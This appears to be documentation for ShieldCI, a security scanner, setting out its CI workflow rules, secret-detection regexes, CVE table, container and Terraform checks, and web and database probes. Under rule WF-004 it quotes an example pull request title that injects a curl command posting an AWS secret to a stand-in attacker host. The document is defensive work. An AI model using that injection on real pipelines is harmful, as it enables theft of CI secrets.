# ShieldCI: Scanner Engines & Detection Heuristics

ShieldCI includes six purpose-built security engines spanning static codebase analysis, live perimeter auditing, and database posture checks. This document details the inner workings, detection rules, regex signatures, and remediation recommendations for each engine.

---

## Table of Contents

- [Overview of Scanner Engines](#overview-of-scanner-engines)
- [1. CI/CD Workflow Scanner (`WorkflowScanner`)](#1-cicd-workflow-scanner-workflowscanner)
  - [Rule WF-001: Insecure Trigger `pull_request_target`](#rule-wf-001-insecure-trigger-pull_request_target)
  - [Rule WF-002: Excessive Pipeline Permissions (`write-all`)](#rule-wf-002-excessive-pipeline-permissions-write-all)
  - [Rule WF-003: Unpinned 3rd-Party Actions (Mutable Tags)](#rule-wf-003-unpinned-3rd-party-actions-mutable-tags)
  - [Rule WF-004: Inline Script Injection Vectors](#rule-wf-004-inline-script-injection-vectors)
  - [Rule WF-005: GitLab CI Disabled Host Key Checking](#rule-wf-005-gitlab-ci-disabled-host-key-checking)
- [2. Secret & Credential Scanner (`SecretScanner`)](#2-secret--credential-scanner-secretscanner)
  - [Signature Pattern Matching](#signature-pattern-matching)
  - [Shannon Entropy Analysis](#shannon-entropy-analysis)
  - [Redaction & Masking Guarantees](#redaction--masking-guarantees)
- [3. Software Composition Analysis (`SCAScanner`)](#3-software-composition-analysis-scascanner)
  - [SBOM Inventory Generation (PURL)](#sbom-inventory-generation-purl)
  - [Advisory CVE Database](#advisory-cve-database)
  - [Semantic Versioning Evaluation](#semantic-versioning-evaluation)
- [4. Container & IaC Scanner (`IaCScanner`)](#4-container--iac-scanner-iacscanner)
  - [Dockerfile Rule IAC-001: Unpinned `:latest` Base Image](#dockerfile-rule-iac-001-unpinned-latest-base-image)
  - [Dockerfile Rule IAC-002: Container Execution as Root](#dockerfile-rule-iac-002-container-execution-as-root)
  - [Dockerfile Rule IAC-003: Exposed Administrative Ports](#dockerfile-rule-iac-003-exposed-administrative-ports)
  - [Terraform Rule IAC-004: Unrestricted Ingress CIDR (0.0.0.0/0)](#terraform-rule-iac-004-unrestricted-ingress-cidr-00000)
- [5. Live Web Perimeter & API Scanner (`WebsiteScanner`)](#5-live-web-perimeter--api-scanner-websitescanner)
  - [SSL/TLS Certificate Auditing](#ssltls-certificate-auditing)
  - [Security Response Headers](#security-response-headers)
  - [CORS Wildcard with Credentials](#cors-wildcard-with-credentials)
  - [Information Disclosure & Banners](#information-disclosure--banners)
  - [Active Sensitive Path Probes](#active-sensitive-path-probes)
- [6. Database Posture & Access Scanner (`DatabaseScanner`)](#6-database-posture--access-scanner-databasescanner)
  - [Connection String Credential Analysis](#connection-string-credential-analysis)
  - [Weak & Default Password Detection](#weak--default-password-detection)
  - [TLS / Encryption Enforcement](#tls--encryption-enforcement)
  - [Network Socket Accessibility](#network-socket-accessibility)
  - [Unauthenticated Protocol Probes (Redis & Elasticsearch)](#unauthenticated-protocol-probes-redis--elasticsearch)

---

## Overview of Scanner Engines

| Engine | Source Code Path | Target Scope | Output Category |
| :--- | :--- | :--- | :--- |
| **`WorkflowScanner`** | `app/scanners/workflow_scanner.py` | GitHub Actions & GitLab CI definitions | `Pipeline Misconfiguration` |
| **`SecretScanner`** | `app/scanners/secret_scanner.py` | Source code, config, `.env`, scripts | `Secret & Credential Leak` |
| **`SCAScanner`** | `app/scanners/sca_scanner.py` | `requirements.txt` dependencies | `Vulnerable Dependency` |
| **`IaCScanner`** | `app/scanners/iac_scanner.py` | `Dockerfile`, `*.tf` | `Container & IaC Exposure` |
| **`WebsiteScanner`** | `app/scanners/web_scanner.py` | Public or internal HTTP/HTTPS endpoints | `Web & API Security Exposure` |
| **`DatabaseScanner`** | `app/scanners/database_scanner.py` | Database URIs or `host:port` pairs | `Database Posture & Access Exposure` |

---

## 1. CI/CD Workflow Scanner (`WorkflowScanner`)

Target files: `.github/workflows/*.yml`, `.github/workflows/*.yaml`, `.gitlab-ci.yml`.

### Rule WF-001: Insecure Trigger `pull_request_target`
- **Severity**: `CRITICAL`
- **Mechanism**: Detects workflows triggered by `on: pull_request_target`.
- **Risk**: Unlike standard `pull_request`, `pull_request_target` runs in the context of the base repository rather than the fork. It has access to repository secrets and a write-scoped `GITHUB_TOKEN`. If the workflow checks out fork code (`actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`), untrusted pull request code can exfiltrate production secrets.
- **Auto-Fix**: Automatically replaced with `on: pull_request` in generated patches.

### Rule WF-002: Excessive Pipeline Permissions (`write-all`)
- **Severity**: `HIGH`
- **Mechanism**: Inspects top-level or job-level `permissions` blocks for `write-all` or broad `write` scopes.
- **Risk**: Violates the principle of least privilege. If any step in the pipeline is compromised, the attacker can use the ambient `GITHUB_TOKEN` to push code to branches, overwrite releases, or alter repository issues.
- **Remediation**: Declare minimal, explicit permissions:
  ```yaml
  permissions:
    contents: read
  ```

### Rule WF-003: Unpinned 3rd-Party Actions (Mutable Tags)
- **Severity**: `MEDIUM`
- **Mechanism**: Inspects `uses:` steps in GitHub Actions jobs. Verifies whether the action reference contains a full 40-character SHA-1 commit hash.
- **Risk**: Referencing actions by mutable branch or release tags (e.g. `uses: actions/checkout@v3`) exposes pipelines to supply chain hijacking. If the maintainer's account is compromised, the tag can be pointed to malicious code.
- **Remediation**: Pin actions to immutable commit SHAs:
  ```yaml
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```

### Rule WF-004: Inline Script Injection Vectors
- **Severity**: `CRITICAL`
- **Mechanism**: Evaluates `run:` commands using the regex:
  $$\$\{\{\s*(github\.event\.issue\.title|github\.event\.pull_request\.title|github\.event\.comment\.body|github\.head_ref)\s*\}\}$$
- **Risk**: Direct interpolation of untrusted user input into shell scripts permits arbitrary command injection. An attacker can submit a pull request title such as `Fix Bug"; curl https://evil.com -d @$AWS_SECRET; #` to execute arbitrary shell commands on the runner.
- **Remediation**: Pass untrusted context through intermediate environment variables:
  ```yaml
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    python process_pr.py "$PR_TITLE"
  ```

### Rule WF-005: GitLab CI Disabled Host Key Checking
- **Severity**: `HIGH`
- **Mechanism**: Searches `.gitlab-ci.yml` for `dangerouslyDisableHostKeyChecking` or `strictHostKeyChecking=no`.
- **Risk**: Disabling SSH host key verification permits Man-In-The-Middle (MITM) attacks during automated deployments.

---

## 2. Secret & Credential Scanner (`SecretScanner`)

Scans all project files, automatically bypassing directories defined in `settings.scanner.IGNORED_DIRECTORIES` (`.git`, `node_modules`, `venv`, `dist`, `build`) and binary extensions (`.png`, `.pdf`, `.zip`, `.pyc`).

### Signature Pattern Matching

| Secret Type | Regular Expression | Severity |
| :--- | :--- | :--- |
| **AWS Access Key ID** | `\b(AKIA[0-9A-Z]{16})\b` | `CRITICAL` |
| **AWS Secret Access Key** | `(?i)aws_secret_access_key\s*=\s*['"]?([A-Za-z0-9/+=]{40})['"]?` | `CRITICAL` |
| **GitHub Personal Access Token** | `\b(ghp_[0-9a-zA-Z]{36}\|github_pat_[0-9a-zA-Z_]{82})\b` | `CRITICAL` |
| **Generic High-Risk API Token** | `(?i)(api[_-]?key\|secret[_-]?token\|auth[_-]?token)\s*[:=]\s*['"]([a-zA-Z0-9_\-]{24,})['"]` | `HIGH` |
| **Private RSA/SSH Key** | `-----BEGIN (RSA \|OPENSSH \|EC )?PRIVATE KEY-----` | `CRITICAL` |
| **Slack Incoming Webhook URL** | `https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+` | `HIGH` |

### Shannon Entropy Analysis

To identify unclassified high-randomness tokens (such as Base64-encoded keys, hex digests, or custom proprietary tokens), the scanner calculates the Shannon Entropy of string tokens with length $\ge 24$:

$$H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$$

Where $P(x_i)$ is the probability of character $x_i$ appearing in the string.
- Default threshold: `4.4` (configurable via `SHIELDCI_ENTROPY_THRESHOLD`).
- Strings exceeding this threshold without matching comment lines are flagged as `MEDIUM` severity suspected private tokens.

### Redaction & Masking Guarantees
To prevent secondary exposure in scan reports, logs, and Webhook payloads, matched secret values are masked:
- Only the first 4 and last 4 characters are preserved (e.g. `AKIA****12AB`).

---

## 3. Software Composition Analysis (`SCAScanner`)

Parses `requirements.txt` manifests to generate software bill-of-materials (SBOM) inventories and audit against known CVE records.

### SBOM Inventory Generation (PURL)
For every pinned dependency, the scanner outputs a standard Package URL (PURL) conforming to the PURL specification:
```json
{
  "name": "requests",
  "version": "2.28.1",
  "purl": "pkg:pypi/requests@2.28.1",
  "file": "requirements.txt"
}
```

### Advisory CVE Database

| Package | Affected Max Version | CVE ID | Severity | CVSS | Vulnerability Title |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `requests` | `2.31.0` | `CVE-2023-32681` | `MEDIUM` | 6.1 | Proxy-Authorization Header Leak |
| `urllib3` | `1.26.17` | `CVE-2023-45803` | `HIGH` | 7.5 | HTTP Request Smuggling & Stream Exposure |
| `pyyaml` | `5.3.1` | `CVE-2020-14343` | `CRITICAL` | 9.8 | Arbitrary Code Execution via `load()` |
| `flask` | `2.2.0` | `CVE-2023-30861` | `HIGH` | 7.5 | Session Cookie Exposure via Cache-Control |
| `django` | `4.2.0` | `CVE-2023-3111` | `HIGH` | 8.1 | Open Redirect and DoS in Login URLs |

### Semantic Versioning Evaluation
Versions are parsed into integer tuples (`[int(p) for p in ver.split(".")]`) and compared directly against maximum vulnerable thresholds to avoid false positives on alpha or patch releases.

---

## 4. Container & IaC Scanner (`IaCScanner`)

Evaluates Dockerfiles (`Dockerfile`, `*.dockerfile`) and Terraform configurations (`*.tf`).

### Dockerfile Rule IAC-001: Unpinned `:latest` Base Image
- **Severity**: `MEDIUM`
- **Detection**: `FROM` directives specifying `:latest` or lacking an explicit tag.
- **Risk**: Introduces unpredictable upstream dependencies into builds, invalidating build reproducibility and introducing unexpected supply chain vulnerabilities.

### Dockerfile Rule IAC-002: Container Execution as Root
- **Severity**: `HIGH`
- **Detection**: Analyzes the entire Dockerfile for a `USER <non-root>` instruction.
- **Risk**: Running containers as default UID 0 (root) allows container escape exploits to achieve root privileges on the underlying host kernel.
- **Auto-Fix**: Injects `USER 10001` before the runtime entrypoint in 1-click patches.

### Dockerfile Rule IAC-003: Exposed Administrative Ports
- **Severity**: `HIGH`
- **Detection**: `EXPOSE` directives declaring ports `22` (SSH), `3389` (RDP), or `23` (Telnet).
- **Risk**: Production containers should be managed via container orchestration control planes (Kubernetes, ECS), not interactive SSH daemons.

### Terraform Rule IAC-004: Unrestricted Ingress CIDR (0.0.0.0/0)
- **Severity**: `HIGH`
- **Detection**: Searches for `cidr_blocks = ["0.0.0.0/0"]` inside security group ingress blocks.
- **Risk**: Exposes infrastructure ports to the open internet without IP restriction.

---

## 5. Live Web Perimeter & API Scanner (`WebsiteScanner`)

Executes non-destructive audits against live web applications and API endpoints.

### SSL/TLS Certificate Auditing
Establishes a socket connection on port 443 and inspects the peer certificate:
- **Expired Certificates**: Flags certificates where `notAfter < now()` as `CRITICAL`.
- **Imminent Expiration**: Flags certificates expiring within $\le 14$ days as `HIGH`.
- **Deprecated TLS Protocols**: Negotiates supported protocol versions. Flags `TLSv1`, `TLSv1.1`, `SSLv2`, and `SSLv3` as `HIGH` (vulnerable to POODLE, BEAST).
- **Untrusted Certificates**: Catches `SSLCertVerificationError` (self-signed, untrusted CA, invalid hostname).

### Security Response Headers

| Header | Expected Setting | Severity if Missing | Protection Mechanism |
| :--- | :--- | :--- | :--- |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | `HIGH` | Prevents SSL stripping and cookie interception over plaintext HTTP. |
| `Content-Security-Policy` | Strict script-src / object-src | `HIGH` | Mitigates Cross-Site Scripting (XSS) and data injection. |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | `MEDIUM` | Defends against Clickjacking framing attacks. |
| `X-Content-Type-Options` | `nosniff` | `LOW` | Prevents MIME-type sniffing by legacy browsers. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | `LOW` | Prevents token and URL leakage in HTTP `Referer` headers. |

*Additionally flags `Content-Security-Policy` containing `'unsafe-inline'` or `'unsafe-eval'` as `MEDIUM` severity.*

### CORS Wildcard with Credentials
- **Severity**: `HIGH`
- **Condition**: `Access-Control-Allow-Origin: *` AND `Access-Control-Allow-Credentials: true`.
- **Risk**: Allows any malicious third-party website to make authenticated requests and read sensitive responses on behalf of a logged-in user.

### Information Disclosure & Banners
- **Server Version Disclosure**: Flags `Server` headers containing numeric version strings (e.g. `Apache/2.4.41`) as `LOW`.
- **Framework Disclosure**: Flags `X-Powered-By` headers (e.g. `Express`, `PHP/7.4`) as `LOW`.

### Active Sensitive Path Probes
Performs non-intrusive `GET` requests against high-risk paths:
- `/.env`: Validates whether the response contains configuration key/value pairs (`APP_`, `DB_`, `=`).
- `/.git/HEAD`: Validates whether the response contains `ref: refs/heads/`.
- `/actuator/env`: Validates Spring Boot actuator environment variable exposure.

---

## 6. Database Posture & Access Scanner (`DatabaseScanner`)

Audits connection strings and live datastores across PostgreSQL, MySQL, MariaDB, Redis, MongoDB, Elasticsearch, and MSSQL.

### Connection String Credential Analysis
- Identifies hardcoded passwords inside connection URIs (`scheme://user:password@host:port/db`).
- Masks passwords in output reports (`scheme://user:****@host:port/db`).

### Weak & Default Password Detection
- Compares provided credentials against a known weak dictionary:
  `{"root", "admin", "password", "123456", "postgres", "guest", "test", "toor", "default"}`.
- If the password matches a default word or matches the username, raises a `CRITICAL` finding.

### TLS / Encryption Enforcement
- Inspects query parameters for `sslmode`, `ssl`, or `tls`.
- Flags `sslmode=disable` or `sslmode=allow` as `HIGH` severity.
- Flags connection strings lacking an explicit `sslmode=require` as `MEDIUM` severity.

### Network Socket Accessibility
Attempts a non-blocking TCP socket connection to the target port with a configurable timeout (default: 4 seconds). If the port accepts connections and the host is not a loopback address, raises a `HIGH` severity finding for direct internet exposure.

### Unauthenticated Protocol Probes (Redis & Elasticsearch)
- **Redis PING Probe**: Connects to port 6379 and transmits the RESP protocol payload `*1\r\n$4\r\nPING\r\n`. If the server responds with `+PONG`, it confirms the server is unauthenticated, allowing arbitrary remote code execution (RCE) and memory key dumps.
- **Elasticsearch Cluster Health Probe**: Transmits an HTTP request to `http://<host>:9200/_cluster/health`. If the cluster responds with HTTP 200 containing cluster status, it confirms unauthenticated cluster access.
